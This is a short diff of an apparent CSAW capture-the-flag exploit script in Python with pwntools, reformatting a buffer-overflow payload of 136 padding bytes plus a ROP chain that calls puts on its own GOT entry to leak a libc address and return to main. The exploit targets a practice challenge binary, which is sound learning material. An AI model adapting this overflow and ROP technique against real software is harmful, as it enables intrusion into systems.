@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 from pwn import *
 
+
 elf = ELF('./popcorn')
 # p = remote('pwn.chal.csaw.io', 1006)
 p = elf.process()
@@ -8,7 +9,13 @@ libc = ELF('./libc.so.6')
 
 pop_rdi = 0x4011eb
 
-payload = b'A' * 136 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])
+payload = (
+    b'A' * 136
+    + p64(pop_rdi)
+    + p64(elf.got['puts'])
+    + p64(elf.plt['puts'])
+    + p64(elf.symbols['main'])
+)
 
 p.sendlineafter('Would you like some popcorn?', payload)
 p.recv()
